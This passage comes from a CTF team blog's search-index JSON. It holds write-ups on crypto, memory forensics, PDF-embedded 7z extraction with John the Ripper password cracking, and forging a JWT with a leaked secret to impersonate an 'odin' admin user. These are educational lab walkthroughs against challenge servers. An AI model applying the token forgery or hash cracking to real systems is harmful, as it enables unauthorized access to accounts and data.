reads the contents of bytes.txt, and prints the line if the byte column has a length of 2. Then removes the \u0026ldquo;bytes=\u0026rdquo; string before the range, and sorts the values numerically. The result should be the hexadecimal bytes of pass.txt in order of the range, and will look something like this:\n0-0 30 1-1 65 2-2 64 3-3 62 4-4 63 ... We can verify that no bytes are missing from the output, and that all bytes are in the correct order.\nNow, we just have to remove the range column and we will get the password\u0026rsquo;s hex:\n$ cat bytes.txt | awk 'length($2)==2 {print $0}' | cut -d\u0026quot;=\u0026quot; -f2 | sort -n | cut -d\u0026quot; \u0026quot; -f2 \u0026gt; pass.hex\nTo convert it from hexadecimal to bytes, we can use xxd:\n$ xxd -r -p pass.hex \u0026gt; pass.txt\nNow repeat the process for flag.zip, but this time using length($2)==4 instead. We can also skip the intermediate hex file as so:\n$ cat bytes.txt | awk 'length($2)==4 {print $0}' | cut -d\u0026quot;=\u0026quot; -f2 | sort -n | cut -d\u0026quot; \u0026quot; -f2 | xxd -r -p \u0026gt; flag.zip\nGetting the flag Now all that\u0026rsquo;s left to do is decompress flag.zip using pass.txt and get the flag!\n$ unzip flag.zip\nArchive: flag.zip [flag.zip] flag.txt password: 0edbca2531daefac9c5c84c016792713fd23681ea8bc1b3d088b617f75940313 extracting: flag.txt $ cat flag.txt\nIJCTF{aa51f2cc8eaf466a277da70db3a3c576} Resources friedrich/hans: IP over ICMP - https://github.com/friedrich/hans editcap - The Wireshark Network Analyzer 3.4.7 - https://www.wireshark.org/docs/man-pages/editcap.html NSS Key Log Format - Mozilla MDN - https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/Key_Log_Format Wireshark Tutorial: Decrypting HTTPS Traffic - https://unit42.paloaltonetworks.com/wireshark-tutorial-decrypting-https-traffic/ Decrypting TLS Streams With Wireshark: Part 1 - https://blog.didierstevens.com/2020/12/14/decrypting-tls-streams-with-wireshark-part-1/ tshark - The Wireshark Network Analyzer 3.4.7 - https://www.wireshark.org/docs/man-pages/tshark.html ","permalink":"https://blog.adelaideb9.com/posts/2021/ijctf/vault/","summary":"Challenge description A robber broke into our vault in the middle of night. There\u0026rsquo;s an indication that the robber tried to steal some items which are considered as confidential assets. Could you figure it out?\nFlag format: IJCTF{[a-f0-9]{32}}\nAuthor: Avilia#1337\nHint #1: \u0026ldquo;When the incident happened, the attacker got into our IP over ICMP tunnel network to access an HTTP/2 web-server with SSL enabled.\u0026rdquo;\nHint #2: \u0026ldquo;Even so, our captured logs aren\u0026rsquo;t precise enough.","title":"Vault - IJCTF 2021"},{"content":"For this challenge we are given a source file and a netcat server which presumably runs the source. Looking through the source code, we see that a integer is taken in as input and using this input, the flag is encrypted. The source is as follows:\n#!/usr/bin/python from functools import reduce with open(\u0026#34;flag\u0026#34;, \u0026#34;r\u0026#34;) as f: key = [ord(x) for x in f.read().strip()] def substitute(value): return (reduce(lambda x, y: x*value+y, key)) % 691 print(\u0026#34;Enter a number and it will be returned with our super secret synthetic substitution technique\u0026#34;) while True: try: value = input(\u0026#34;\u0026gt; \u0026#34;) if value == \u0026#39;quit\u0026#39;: quit() value = int(value) enc = substitute(value) print(\u0026#34;\u0026gt;\u0026gt; \u0026#34;, end=\u0026#34;\u0026#34;) print(enc) except ValueError: print(\u0026#34;Invalid input. \u0026#34;) The main function of interest to us is the substitute function.\ndef substitute(value): return (reduce(lambda x, y: x*value+y, key)) % 691 After researching what the reduce function does, we see that we are essentially recursively calling\n$$f(x,y) = kx+y$$\nwhere $k$ is the user input, $x$ is the previous result and $y$ is the next character in the flag. As $f$ is a linear function, we can produce the following linear equation.\n$$g(k) \\equiv x_0 k^{n-1}+x_1 k^{n-2}+\u0026hellip;+x_{n-2} k+x_{n-1} \\pmod{691}$$\nwhere $x_n$ is the $n$th character of the flag. To test our understanding, let us evaluate $g(0)$. As per $g(k)$, we should have $g(0)=x_{n-1}$. In other words, we should get the last letter of the flag, hence we should get the ASCII value of }. Connecting to the server and trying it, we indeed get $125$.\nKnowing this, we can make a $n \\times n$ linear system where the $n$th equation is the equation $g(n)$.\n$$\\begin{aligned}g(0) \u0026amp;\\equiv x_0 \\times 0^{n-1}+ x_1 \\times 0^{n-2}+ \u0026hellip; +x_{n-2} \\times 0+x{n-1} \\pmod{691} \\\\ g(1) \u0026amp;\\equiv x_0 \\times 1^{n-1}+ x_1 \\times 1^{n-2}+ \u0026hellip; +x_{n-2} \\times 1+x_{n-1} \\pmod{691} \\\\ g(2) \u0026amp;\\equiv x_0 \\times 2^{n-1}+ x_1 \\times 2^{n-2}+ \u0026hellip; +x_{n-2} \\times 2+x_{n-1} \\pmod{691} \\end{aligned}$$\nThis can be expressed as:\n$$A\\textbf{X}=\\textbf{B} \\pmod{691}$$\nwhere A is the coefficient matrix:\n$$\\begin{bmatrix}0^{n-1} \u0026amp; 0^{n-2} \u0026amp; \\cdots \u0026amp; 0^{1} \u0026amp; 1 \\\\ 1^{n-1} \u0026amp; 1^{n-2} \u0026amp; \\cdots \u0026amp; 1^{1} \u0026amp; 1 \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \u0026amp; \\vdots \\\\ (n-2)^{n-1} \u0026amp; (n-2)^{n-2} \u0026amp; \\cdots \u0026amp; (n-2)^{1} \u0026amp; 1 \\\\ (n-1)^{n-1} \u0026amp; (n-1)^{n-2} \u0026amp; \\cdots \u0026amp; (n-1)^{1} \u0026amp; 1\\end{bmatrix}$$\nand B is the outputs for each given input:\n$$\\begin{bmatrix}g(0) \\\\ g(1) \\\\ \\vdots \\\\ g(n-2) \\\\ g(n-1) \\end{bmatrix}$$\nand $X$ is the matrix of characters (essentially the flag).\nWhile we are not sure as to how long the flag will be, it is reasonable to say it will be less that 100 characters (based off previously retrieved flags). Using this equation and the fact that the characters must be integers, we can solve the system over $\\mathbb{Z}\\pmod{691}$. This can be done with the following sage maths script that uses pwntools to connect to the server and collect the results.\nfrom pwn import * import re # Connecting with pwntools nc = remote(\u0026#39;crypto.2021.chall.actf.co\u0026#39;, 21601) nc.recvline() nums = [] for i in range(100): # Sending the numbers from 0-99 to the server and listening to the response nc.sendline(str(i)) res = str(nc.recvline()) # Stripping the number from the response and appending it to numbers nums.append(int(re.findall(\u0026#34;[0-9]+\u0026#34;, res)[0])) # Using sagemaths to solve the linear system M = matrix(ZZ, 100, 100, lambda x, y: pow(x, 99-y)) b = vector(GF(691), 100, nums) solution = M.solve_right(b) # Converting the solution into a string flag = \u0026#39;\u0026#39;.join(chr(c) for c in solution) print(flag) Sure enough, after a minute or so of running, we get the flag!\nactf{polynomials_20a829322766642530cf69}\n","permalink":"https://blog.adelaideb9.com/posts/2021/angstromctf/substitution/","summary":"For this challenge we are given a source file and a netcat server which presumably runs the source. Looking through the source code, we see that a integer is taken in as input and using this input, the flag is encrypted. The source is as follows:\n#!/usr/bin/python from functools import reduce with open(\u0026#34;flag\u0026#34;, \u0026#34;r\u0026#34;) as f: key = [ord(x) for x in f.read().strip()] def substitute(value): return (reduce(lambda x, y: x*value+y, key)) % 691 print(\u0026#34;Enter a number and it will be returned with our super secret synthetic substitution technique\u0026#34;) while True: try: value = input(\u0026#34;\u0026gt; \u0026#34;) if value == \u0026#39;quit\u0026#39;: quit() value = int(value) enc = substitute(value) print(\u0026#34;\u0026gt;\u0026gt; \u0026#34;, end=\u0026#34;\u0026#34;) print(enc) except ValueError: print(\u0026#34;Invalid input.","title":"Substitution - ångstromCTF 2021"},{"content":"notes I may not be familiar with .mem files but memory forensics, and more specifically volatility seems like its going to be our friend here.\nStarting with volatility -f image.mem imageinfo we get Win7SP1x64 as our top suggested profile, providing confirmation that we\u0026rsquo;ve got a valid dump.\nUsing one of volatility\u0026rsquo;s coolest features we can use mkdir shots \u0026amp;\u0026amp; volatility -f image.mem --profile=Win7SP1x64 screenshot --dump-dir=shots to get the following wire-frame screenshot from memory. Now we know that the flag was probably open in Notepad, given the hint \u0026ldquo;There wasn\u0026rsquo;t any suspicious network activity or anything\u0026hellip; it\u0026rsquo;s almost as if they just had their passwords up right on the screen.\u0026rdquo;\nTo grab the contents from Notepad we\u0026rsquo;ll want to first find it\u0026rsquo;s PID and then get a memory dump of said process to analyse.\nvolatility -f image.mem --profile=Win7SP1x64 pslist\nOffset(V) Name PID PPID Thds Hnds Sess Wow64 Start \\ ------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ... 0xfffffa8000dd0060 notepad.exe 2696 2288 4 309 1 0 2021-03-20 17:59:34 UTC+0000\\ ... volatility -f image.mem --profile=Win7SP1x64 memdump --dump-dir=./ -p 2696\nUnfortunately volatility doesn\u0026rsquo;t seem have a handy plugin to give us whatever text was written into Notepad, so we\u0026rsquo;ll just have to search the resultant dump for any strings that might be part of the flag.\ncat 2696.dmp | strings | grep UMASS\nNo luck, a few more greps later and its pretty clear that either the flag\u0026rsquo;s not there or its encoded in format that would make it difficult to find by simply searching through strings.\nFrom here a bit of intuition and luck might lead you to the idea that the user may have copied the flag from Notepad onto their clipboard \u0026hellip;\nvolatility -f image.mem --profile=Win7SP1x64 clipboard\nSession WindowStation Format Handle Object Data ---------- ------------- ------------------ ------------------ ------------------ -------------------------------------------------- 1 WinSta0 CF_UNICODETEXT 0x5a00b5 0xfffff900c26aeb60 VU1BU1N7JDNDVVIzXyQ3MFJhZzN9Cg== 1 WinSta0 CF_TEXT 0x64006e00000010 ------------------ 1 WinSta0 0x13c01b7L 0x0 ------------------ 1 WinSta0 CF_TEXT 0x1 ------------------ 1 ------------- ------------------ 0x13c01b7 0xfffff900c06fa270 \u0026hellip; and you\u0026rsquo;d be right, we got some data! Judging by that padding it\u0026rsquo;s base64 encoded. Decoding it gives us the flag UMASS{$3CUR3_$70Rag3} 🥳\n","permalink":"https://blog.adelaideb9.com/posts/2021/umass/notes/","summary":"notes I may not be familiar with .mem files but memory forensics, and more specifically volatility seems like its going to be our friend here.\nStarting with volatility -f image.mem imageinfo we get Win7SP1x64 as our top suggested profile, providing confirmation that we\u0026rsquo;ve got a valid dump.\nUsing one of volatility\u0026rsquo;s coolest features we can use mkdir shots \u0026amp;\u0026amp; volatility -f image.mem --profile=Win7SP1x64 screenshot --dump-dir=shots to get the following wire-frame screenshot from memory.","title":"notes - UMassCTF '21"},{"content":"Investigating the mystery PDF File We\u0026rsquo;re given a modified PDF file of the infamous research paper, \u0026ldquo;Chicken Chicken Chicken: Chicken Chicken\u0026rdquo;, by Doug Zongker at the University of Washington.\nchicken.pdf\nSince we know this is a published research paper, we can download a copy of the original PDF file and compare the two for any difference:\nWe see that at around line 202, there is an extra OpenAction object inserted into the document, with a data stream beginning with 7z:\n$ hexdump -C chicken.pdf | grep 7z -A 11\n00001980 0d 0a 37 7a bc af 27 1c 00 04 2b 65 00 6c 30 00 |..7z..\u0026#39;...+e.l0.| 00001990 00 00 00 00 00 00 6a 00 00 00 00 00 00 00 4c 6a |......j.......Lj| 000019a0 b9 1e 0c fd be 4f 3b 93 39 58 52 bd 23 ea 0b 2d |.....O;.9XR.#..-| 000019b0 8d d1 a2 79 55 0b d8 05 68 43 0d ae 06 d5 2d f8 |...yU...hC....-.| 000019c0 25 ff b4 16 8d 21 3b 88 16 35 44 69 6d 5c 0e 59 |%....!;..5Dim\\.Y| 000019d0 a7 b3 01 04 06 00 01 09 30 00 07 0b 01 00 02 24 |........0......$| 000019e0 06 f1 07 01 0a 53 07 56 f2 43 9d 21 42 28 ae 21 |.....S.V.C.!B(.!| 000019f0 21 01 00 01 00 0c 29 25 00 08 0a 01 4e 5d 1c 8e |!.....)%....N]..| 00001a00 00 00 05 01 19 09 00 00 00 00 00 00 00 00 00 11 |................| 00001a10 0f 00 73 00 65 00 63 00 72 00 65 00 74 00 00 00 |..s.e.c.r.e.t...| 00001a20 19 04 00 00 00 00 14 0a 01 00 80 33 4a 2c b7 1d |...........3J,..| 00001a30 d7 01 15 06 01 00 20 80 a4 81 00 00 0a 65 6e 64 |...... ......end| The data stream starts with the 7z magic bytes, confirming that it is indeed a 7z file:\nList of file signatures - Wikipedia\nLet\u0026rsquo;s extract the stream with a bit of Bash-fu to a chicken.hex file:\n$ hexdump -C chicken.pdf | grep 7z -A 11 | cut -d ' ' -f3- | rev | cut -d ' ' -f3- | rev \u0026gt; chicken.hex\n0d 0a 37 7a bc af 27 1c 00 04 2b 65 00 6c 30 00 00 00 00 00 00 00 6a 00 00 00 00 00 00 00 4c 6a b9 1e 0c fd be 4f 3b 93 39 58 52 bd 23 ea 0b 2d 8d d1 a2 79 55 0b d8 05 68 43 0d ae 06 d5 2d f8 25 ff b4 16 8d 21 3b 88 16 35 44 69 6d 5c 0e 59 a7 b3 01 04 06 00 01 09 30 00 07 0b 01 00 02 24 06 f1 07 01 0a 53 07 56 f2 43 9d 21 42 28 ae 21 21 01 00 01 00 0c 29 25 00 08 0a 01 4e 5d 1c 8e 00 00 05 01 19 09 00 00 00 00 00 00 00 00 00 11 0f 00 73 00 65 00 63 00 72 00 65 00 74 00 00 00 19 04 00 00 00 00 14 0a 01 00 80 33 4a 2c b7 1d d7 01 15 06 01 00 20 80 a4 81 00 00 0a 65 6e 64 From reading the technical specifications of the 7z file format, we know the file has to begin with 37 7A BC AF 27 1C and end with 00 00. Therefore, we can trim off the starting 0D 0A and the ending 0A 65 6E 64 bytes, as they are not a part of the file.\nConvert the hex dump to a 7z file:\n$ xxd -r -p chicken.hex chicken.7z\nExtracting and cracking 7z password hash with John the Ripper Upon trying to extract the 7z file, we\u0026rsquo;re greeted with a password prompt:\n$ 7z x chicken.7z\n7-Zip [64] 17.03 : Copyright (c) 1999-2020 Igor Pavlov : 2017-08-28 p7zip Version 17.03 (locale=en_AU.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs x64) Scanning the drive for archives: 1 file, 186 bytes (1 KiB) Extracting archive: chicken.7z -- Path = chicken.7z Type = 7z Physical Size = 186 Headers Size = 138 Method = LZMA2:12 7zAES Solid = - Blocks = 1 Enter password (will not be echoed): _ We can obtain the password hash with 7z2john:\n$ 7z2john ./chicken.7z \u0026gt; chicken.hash\nchicken.7z:$7z$2$19$0$$8$56f2439d214228ae0000000000000000$2384223566$48$41$0cfdbe4f3b93395852bd23ea0b2d8dd1a279550bd80568430dae06d52df825ffb4168d213b88163544696d5c0e59a7b3$37$00 Now that we have the password hash, let\u0026rsquo;s crack it using John with the rockyou.txt wordlist:\n$ john chicken.hash --wordlist=rockyou.txt --format=7z-opencl\nDevice 2@arch-zippy: GeForce GTX 1070 Using default input encoding: UTF-8 Loaded 1 password hash (7z-opencl, 7-Zip [SHA256 AES OpenCL]) Cost 1 (iteration count) is 524288 for all loaded hashes Cost 2 (padding size) is 7 for all loaded hashes Cost 3 (compression type) is 2 for all loaded hashes Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status 0g 0:00:00:15 0.36% (ETA: 00:59:49) 0g/s 3576p/s 3576c/s 3576C/s Dev#2:61°C iiloveyou..simone13 0g 0:00:11:47 16.93% (ETA: 00:59:03) 0g/s 3736p/s 3736c/s 3736C/s Dev#2:59°C yahoomylove..y2j341 0g 0:00:19:51 29.15% (ETA: 00:57:34) 0g/s 3643p/s 3643c/s 3643C/s Dev#2:60°C rebel9250..rdoleo pineapple95 (chicken.7z) 1g 0:00:21:25 DONE (2021-03-29 00:10) 0.000778g/s 3627p/s 3627c/s 3627C/s Dev#2:59°C pinkice88..pincy Use the \u0026quot;--show\u0026quot; option to display all of the cracked passwords reliably Session completed After 21 gruelling minutes, we get the cracked password:\npineapple95\nExtract the 7z:\n$ 7z x chicken.7z\n7-Zip [64] 17.03 : Copyright (c) 1999-2020 Igor Pavlov : 2017-08-28 p7zip Version 17.03 (locale=en_AU.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs x64) Scanning the drive for archives: 1 file, 186 bytes (1 KiB) Extracting archive: chicken.7z -- Path = chicken.7z Type = 7z Physical Size = 186 Headers Size = 138 Method = LZMA2:12 7zAES Solid = - Blocks = 1 Enter password (will not be echoed): pineapple95 Everything is Ok Size: 37 Compressed: 186 The 7z file contains a secret file, let\u0026rsquo;s read it:\n$ cat secret\nVU1BU1N7QF9sIUxfNW03SCFuXzN4N3JAfQo= This string seems to be encoded in base64, as hinted by the = padding. Decoding it gives:\n$ echo \u0026quot;VU1BU1N7QF9sIUxfNW03SCFuXzN4N3JAfQo=\u0026quot; | base64 -d\nUMASS{@_l!L_5m7H!n_3x7r@} Winner winner chicken dinner, we got the flag!\nResources https://isotropic.org/papers/chicken.pdf http://myexperimentswithmalware.blogspot.com/2014/09/pdf-analysis-with-peepdf.html https://en.wikipedia.org/wiki/List_of_file_signatures https://www.7-zip.org/recover.html ","permalink":"https://blog.adelaideb9.com/posts/2021/umass/chicken/","summary":"Investigating the mystery PDF File We\u0026rsquo;re given a modified PDF file of the infamous research paper, \u0026ldquo;Chicken Chicken Chicken: Chicken Chicken\u0026rdquo;, by Doug Zongker at the University of Washington.\nchicken.pdf\nSince we know this is a published research paper, we can download a copy of the original PDF file and compare the two for any difference:\nWe see that at around line 202, there is an extra OpenAction object inserted into the document, with a data stream beginning with 7z:","title":"Chicken - UMassCTF '21"},{"content":"The Heim Upon navigating to the given URL, we\u0026rsquo;re met with a login form which asks the user for a \u0026ldquo;name\u0026rdquo;, claiming that \u0026ldquo;only those who BEARER a token may enter\u0026rdquo;.\nAfter entering a name and hitting \u0026ldquo;Enter\u0026rdquo;, we are then redirected to the /auth/authorised page containing our access token:\nThis likely suggests that we\u0026rsquo;re dealing with some type of bearer token authentication. Bearer tokens allow requests to authenticate by using a cryptic string generated and encrypted by the server, such as a JSON Web Token, which looks something akin to this:\nThis token is then included in the HTTP header, in the format of:\nAuthorization: Bearer \u0026lt;JWT\u0026gt; Intercepting requests with Burp Suite Let\u0026rsquo;s intercept the outbound POST request made to /auth with Burp Suite\u0026rsquo;s proxy feature, and forward the request to the repeater with Ctrl-R to try and figure out what is happening behind the scenes:\nWe see that the browser first makes a POST request to /auth with the form data, and is then redirected to the URL:\n/auth?access_token=\u0026lt;JWT\u0026gt;\u0026amp;jwt_secret_key=arottenbranchwillbefoundineverytree\nLeaked at the end of the redirect URL is the jwt_secret_key, which is used for encrypting JSON Web Tokens:\narottenbranchwillbefoundineverytree\nWhile looking for more API endpoints on the website by trying related keywords, we stumbled upon /heim, which returned:\n{ \u0026#34;msg\u0026#34;: \u0026#34;Missing Authorization Header\u0026#34; } This means that the web server is expecting a Bearer token in the HTTP header, so let\u0026rsquo;s add that to our request in Burp Suite\u0026rsquo;s repeater:\nWe received a massive message encoded in base64, let\u0026rsquo;s decode it:\n$ echo \u0026quot;ewogICAgIm...AgIH0KfQ==\u0026quot; | base64 -d\n{ \u0026#34;api\u0026#34;: { \u0026#34;v1\u0026#34;: { \u0026#34;/auth\u0026#34;: { \u0026#34;get\u0026#34;: { \u0026#34;summary\u0026#34;: \u0026#34;Debugging method for authorization post\u0026#34;, \u0026#34;security\u0026#34;: \u0026#34;None\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;access_token\u0026#34;: { \u0026#34;required\u0026#34;: true, \u0026#34;description\u0026#34;: \u0026#34;Access token from recently authorized Viking\u0026#34;, \u0026#34;in\u0026#34;: \u0026#34;path\u0026#34;, }, \u0026#34;jwt_secret_key\u0026#34;: { \u0026#34;required\u0026#34;: false, \u0026#34;description\u0026#34;: \u0026#34;Debugging - should be removed in prod Heim\u0026#34;, \u0026#34;in\u0026#34;: \u0026#34;path\u0026#34; } } }, \u0026#34;post\u0026#34;: { \u0026#34;summary\u0026#34;: \u0026#34;Authorize yourself as a Viking\u0026#34;, \u0026#34;security\u0026#34;: \u0026#34;None\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;username\u0026#34;: { \u0026#34;required\u0026#34;: true, \u0026#34;description\u0026#34;: \u0026#34;Your Viking name\u0026#34;, \u0026#34;in\u0026#34;: \u0026#34;body\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;multipart/x-www-form-urlencoded\u0026#34; } } } }, \u0026#34;/heim\u0026#34;: { \u0026#34;get\u0026#34;: { \u0026#34;summary\u0026#34;: \u0026#34;List the endpoints available to named Vikings\u0026#34;, \u0026#34;security\u0026#34;: \u0026#34;BearerAuth\u0026#34; } }, \u0026#34;/flag\u0026#34;: { \u0026#34;get\u0026#34;: { \u0026#34;summary\u0026#34;: \u0026#34;Retrieve the flag\u0026#34;, \u0026#34;security\u0026#34;: \u0026#34;BearerAuth\u0026#34; } } } } } Nice! We have obtained a list of all available endpoints and now know the flag is located at /flag, and that the GET method for /auth was originally meant to be a debugging endpoint, explaining why jwt_secret_key was leaked in the redirect URL.\nMaking a GET request to /flag with our Bearer token returns:\n{ \u0026#34;msg\u0026#34;: \u0026#34;You are not worthy. Only the AllFather Odin may view the flag\u0026#34; } Seems like only Odin is worthy enough to view the flag! Also, trying to submit \u0026ldquo;odin\u0026rdquo; as the name in the login form returns:\n{ \u0026#34;error\u0026#34;: \u0026#34;You are not wise enough to be Odin\u0026#34; } Though, since we can obtain a sample access token and are in possession of the secret key, we can forge our own tokens to authenticate as the Odin user.\nForging Odin\u0026rsquo;s token Using CyberChef tool, we can easily read the payload of our own JWT string with the \u0026ldquo;JWT decode\u0026rdquo; function:\nWe see that the JWT payload contains the following data:\n{ \u0026#34;fresh\u0026#34;: false, \u0026#34;iat\u0026#34;: 1617017482, \u0026#34;jti\u0026#34;: \u0026#34;380b9f5c-fb31-479e-a189-59e2c8040453\u0026#34;, \u0026#34;nbf\u0026#34;: 1617017482, \u0026#34;type\u0026#34;: \u0026#34;access\u0026#34;, \u0026#34;sub\u0026#34;: \u0026#34;samiko\u0026#34;, \u0026#34;exp\u0026#34;: 1617018382 } Of all variables, sub (subject) and exp (expiration time) are the ones that appear most interesting to us, since we want to forge a token for Odin (that never expires!), so let\u0026rsquo;s modify the payload to the following:\n{ \u0026#34;fresh\u0026#34;: false, \u0026#34;iat\u0026#34;: 1617017482, \u0026#34;jti\u0026#34;: \u0026#34;380b9f5c-fb31-479e-a189-59e2c8040453\u0026#34;, \u0026#34;nbf\u0026#34;: 1617017482, \u0026#34;type\u0026#34;: \u0026#34;access\u0026#34;, \u0026#34;sub\u0026#34;: \u0026#34;odin\u0026#34;, \u0026#34;exp\u0026#34;: 9999999999 } Using the \u0026ldquo;JWT Sign\u0026rdquo; function with the leaked jwt_secret_key and HS256 as parameters, we get the token:\nUsing the forged token in the HTTP header as a Bearer token, we make a GET request to /flag:\nVoila! We got the flag:\nUMASS{liveheim_laughheim_loveheim} Resources https://swagger.io/docs/specification/authentication/bearer-authentication/ https://research.securitum.com/jwt-json-web-token-security/ https://gchq.github.io/CyberChef/ ","permalink":"https://blog.adelaideb9.com/posts/2021/umass/heim/","summary":"The Heim Upon navigating to the given URL, we\u0026rsquo;re met with a login form which asks the user for a \u0026ldquo;name\u0026rdquo;, claiming that \u0026ldquo;only those who BEARER a token may enter\u0026rdquo;.\nAfter entering a name and hitting \u0026ldquo;Enter\u0026rdquo;, we are then redirected to the /auth/authorised page containing our access token:\nThis likely suggests that we\u0026rsquo;re dealing with some type of bearer token authentication. Bearer tokens allow requests to authenticate by using a cryptic string generated and encrypted by the server, such as a JSON Web Token, which looks something akin to this:","title":"Heim - UMassCTF '21"},{"content":"The challenge description starts \u0026lsquo;My buddies Whitfield and Martin were trying to share a secret key\u0026rsquo;, so googling something like \u0026lsquo;Whitfield Martin cipher\u0026rsquo; seems like a good place to begin. Immediately we get results for the Diffie–Hellman key exchange, which fortunately can be described in terms of A, B, p, g, and s (the value of the secret key we need).\nScripts to brute-force this secret key are easy to find on GitHub. We used this DHAttack.py script to get the flag utflag{53919}, although there are some much faster alternatives. Try this script to get the flag yourself:\n#!/usr/bin/python3 # Based on github.com/DrMMZ/Attack-Diffie-Hellman p = 69691 g = 1001 A = 17016 B = 47643 for x in range(1, p): # or (g**x) % p == B if (g**x) % p == A: a = x s = (B**a) % p # or (A**b) % p print(s) ","permalink":"https://blog.adelaideb9.com/posts/2021/utctf/small-p-problems/","summary":"The challenge description starts \u0026lsquo;My buddies Whitfield and Martin were trying to share a secret key\u0026rsquo;, so googling something like \u0026lsquo;Whitfield Martin cipher\u0026rsquo; seems like a good place to begin. Immediately we get results for the Diffie–Hellman key exchange, which fortunately can be described in terms of A, B, p, g, and s (the value of the secret key we need).\nScripts to brute-force this secret key are easy to find on GitHub.","title":"Small P Problems - UTCTF 2021"},{"content":"We\u0026rsquo;re given the encrypted flag wmysau{foeim_Tfusoli} along with some additional encrypted text to help us \u0026lsquo;Hkgxologflutleiaymt xgf Azutgkrftmtf ltmntf ERW wfr ELW wfmtk Rkweq\u0026rsquo;.\nSome familiarity with common ciphers, along with the hint \u0026lsquo;This is a substitution cipher\u0026rsquo;, give us a pretty good direction to pursue so we decided to use this online tool for brute-forcing the solution.\nHowever, trying brute-forcing the text rendered nothing more decipherable than the initial text. Instead we look to the challenge title, where we find that the word vernacular refers to local languages or dialects. Perhaps the cipher text is in a different language? The hint \u0026lsquo;The plaintext may not necessarily be in English\u0026rsquo; confirms this.\nSome experimentation with different languages and google translates produces the string in German \u0026lsquo;provisionsgeschmüte von mageordneten setzen cdu und csu unter druck\u0026rsquo;. In English, \u0026lsquo;disregarding commissions from the ordered people put cdu and csu under pressure.\u0026rsquo; Looks like we found a valid substitution! Trying (using all English characters) on the encrypted flag, with attention to capitalisation, gave us utflag{nicht_English}.\n","permalink":"https://blog.adelaideb9.com/posts/2021/utctf/various-vernacular/","summary":"We\u0026rsquo;re given the encrypted flag wmysau{foeim_Tfusoli} along with some additional encrypted text to help us \u0026lsquo;Hkgxologflutleiaymt xgf Azutgkrftmtf ltmntf ERW wfr ELW wfmtk Rkweq\u0026rsquo;.\nSome familiarity with common ciphers, along with the hint \u0026lsquo;This is a substitution cipher\u0026rsquo;, give us a pretty good direction to pursue so we decided to use this online tool for brute-forcing the solution.\nHowever, trying brute-forcing the text rendered nothing more decipherable than the initial text.","title":"Various Vernacular - UTCTF 2021"},{"content":"Browser Bias This challenge gives us very little information, just a url to a site that tells us Sorry, this site is only optimized for browsers that run on commodo 64. However, this also narrows our focus down to a singular goal - trying to convince the website that we are accessing it from a whatever a \u0026lsquo;commodo 64\u0026rsquo; is.\nThe first thing we need to know is how the browser can determine what type of client is making a request to it. It turns out, a site can only determine this through the User-Agent header. We can manipulate this information in a variety of ways - like with browser extensions or on some browsers using the Developer Tools - but for the sake of controlling exactly what headers are passed over we made this handy little python function.\n{% gist 889226036803bab244ae41b127dc0ab3 %}\nNext we have to figure out what our user-agent string should actually be. If we pass \u0026lsquo;commodo 64\u0026rsquo; as the user-agent parameter of our function nothing changes. Googling commodo 64, we get results for the 1982 computer, The Commodore 64, but making that the header doesn\u0026rsquo;t work either. The part of the challenge we\u0026rsquo;re forgeting is that the site requires browsers that run on commodo 64. We need to find the header of a browser that works on the Commodore 64 \u0026hellip;\n\u0026hellip; here\u0026rsquo;s one! Hyperlink/2.5e (Commodore 64)\nPut that into our function and we get Welcome fellow c64 user. flag{8b1t_w3b}\nRobot Talk We found the best way to comunicate with challenges.neverlanctf.com:1120 was through Telnet!\nHere\u0026rsquo;s the handy script we made \u0026hellip;\n{% gist 5edbe8981351b9213bad90cd38135a0d %}\n\u0026hellip; and here\u0026rsquo;s the outputted flag flag{Ant1_hum4n}\nBitsnBytes Given the \u0026lsquo;programming\u0026rsquo; category, the title, and the fact that we are only linked to an image with green and gray squres, we figured that each colour represented a bit (1 or 0 in binary) and we had to write a script that would translate it.\n{% gist 24c0d9afe556dba4f84e383b62d4469b %}\nHere, each green square is decoded as a zero, and each gray is a one. Since this is an svg, which is conveniently a file type where infomation is stored in plain text, we didn\u0026rsquo;t need to bring out any python image-processing libraries. Then we would convert the binary string to plain text.\nThe problem was, we weren\u0026rsquo;t getting the flag - we were getting something like this time hash:076a1b24abb4870fc5eb892de796b5b32642f95664c04ff0d9b2b96c58a0b. The trick to this challenge was that the server only spits out the image of the encoded flag at hourly intervals, during the minute after the clock has shifted to the new hour. Once we got the right image we also got Now you've got it! Here's your flag: flag{its_all_ab0ut_timing}.\n","permalink":"https://blog.adelaideb9.com/posts/2020/neverlan/","summary":"Browser Bias This challenge gives us very little information, just a url to a site that tells us Sorry, this site is only optimized for browsers that run on commodo 64. However, this also narrows our focus down to a singular goal - trying to convince the website that we are accessing it from a whatever a \u0026lsquo;commodo 64\u0026rsquo; is.\nThe first thing we need to know is how the browser can determine what type of client is making a request to it.","title":"NeverLAN CTF 2020 Write-up"}]